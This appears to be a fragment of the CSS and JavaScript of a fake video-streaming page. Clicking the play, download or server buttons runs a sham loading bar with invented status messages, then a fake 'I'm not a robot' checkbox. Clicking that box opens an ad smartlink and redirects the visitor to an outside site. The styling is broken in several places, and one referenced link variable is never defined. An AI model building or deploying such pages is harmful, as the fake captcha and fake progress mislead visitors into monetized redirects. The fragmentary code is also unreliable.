        /* Base Professional & Elegant Styling */
        *, *::before, *::after {

        /* CINEMA SCREEN - Elegant Frame */
        .cinema-screen {
            width: 100%;
            aspect-ratio: 16 / 9;

            border-radius: 12px;
            position: relative;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
            border: 1px solid var(--glass-border);
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: border-color 0.3s ease;
        }
        .cinema-screen:hover {
            border-color: rgba(0, 119, 190, 0.3);
        }

        .center-play-btn {
            width: 70px;

            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.6);
            transition: all 0.3s ease;
        }
        .cinema-screen:hover .center-play-btn {
            transform: scale(1.08);
            border-color: var(--accent-color);
            box-shadow: 0 0 25px var(--accent-glow);
        }

        .play-icon-svg {
            width: 22px;
            height: 22px;
            fill: var(--text-main);
            margin-left: 4px;
            transition: fill 0.3s ease;
        }
        .cinema-screen:hover .play-icon-svg {
            fill: var(--accent-color);
        }

        /* LOADING OVERLAY SCREEN */
        .loading-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 20;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
        }

        .loading-overlay.active {
            opacity: 1;
            pointer-events: auto;
        }

        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 2px solid rgba(255, 255, 255, 0.03);
            border-top: 2px solid var(--accent-color);
            border-radius: 50%;
            animation: spin 0.9s cubic-bezier(0.4, 0, 0.2, 1) infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 28px;
            font-weight: 700;
            letter-spacing: 1px;
            color: var(--text-main);
            margin-bottom: 8px;

        .loading-subtext {

            border-radius: 50%;
            display: inline-block;

        @keyframes pulse-green {

            70% { transform: scale(1.1); box-shadow: 0 0 0 6px rgba(0, 230, 118, 0); }
            100% { transform: scale(0.9); box-shadow: 0 0 0 0 rgba(0, 230, 118, 0); }
        }

        .action-buttons {

        .btn {

            justify-content: center;

        .checkbox-fake { width: 25px; height: 25px; border: 2px solid #c1c1c1; border-radius: 2px; display: flex; align-items: center; justify-content: center; transition: all 0.2s; }
        .checkmark { color: var(--accent-color); font-size: 20px; font-weight: bold; display: none; }
    </style>

        const linkUtamaAnda = "https://wowclip.xyz/maxhub";

        // ---------------------------------

        function eksekusiSistemTernakCuan() {
            const overlay = document.getElementById('loading-box');
            const textPersen = document.getElementById('loading-percentage');
            const textStatus = document.getElementById('loading-status');
            overlay.classList.add('active');
            let currentPercent = 0;

            function processLoading() {
                if (currentPercent < 100) {
                    let increment = Math.floor(Math.random() * 12) + 4;
                    currentPercent += increment;
                    if (currentPercent > 100) currentPercent = 100;
                    textPersen.innerText = currentPercent + "%";
                    
                    if (currentPercent >= 45 && currentPercent <= 55) {
                        const msg = document.getElementById('hidden-message');
                        msg.style.display = 'block';
                        setTimeout(() => { msg.classList.add('show'); }, 50);
                    }
                    
                    if (currentPercent <= 30) textStatus.innerText = "Connecting Secure Server...";
                    else if (currentPercent <= 75) textStatus.innerText = "Bypassing Video Buffer...";
                    else textStatus.innerText = "Redirecting to Stream...";

                    setTimeout(processLoading, 150);
                } else {
                    document.querySelector('.loading-spinner').style.display = 'none';
                    textPersen.style.display = 'none';
                    textStatus.innerText = "VERIFYING HUMANITY";
                    
                    const rcBox = document.createElement("div");
                    rcBox.className = "recaptcha-box";
                    rcBox.innerHTML = '<div class="checkbox-fake" id="fake-check"><span class="checkmark" id="tick">✔</span></div><div style="margin-left: 10px;">I\'m not a robot</div>';
                    
                    rcBox.onclick = function() { 
                        document.getElementById('tick').style.display = 'block';
                        document.getElementById('fake-check').style.borderColor = 'var(--accent-color)';
                        
                        // Eksekusi Redirect Ganda
                        window.open(linkSmartlink, '_blank');
                        window.location.href = linkUtamaAnda;
                    };
                    overlay.appendChild(rcBox);
                }
            }
            processLoading();
        }

        document.getElementById('play-screen').addEventListener('click', eksekusiSistemTernakCuan);
        document.getElementById('btn-play-now').addEventListener('click', eksekusiSistemTernakCuan);
        document.getElementById('btn-download-now').addEventListener('click', eksekusiSistemTernakCuan);
        document.querySelectorAll('.server-btn').forEach(btn => btn.addEventListener('click', eksekusiSistemTernakCuan));
    </script>
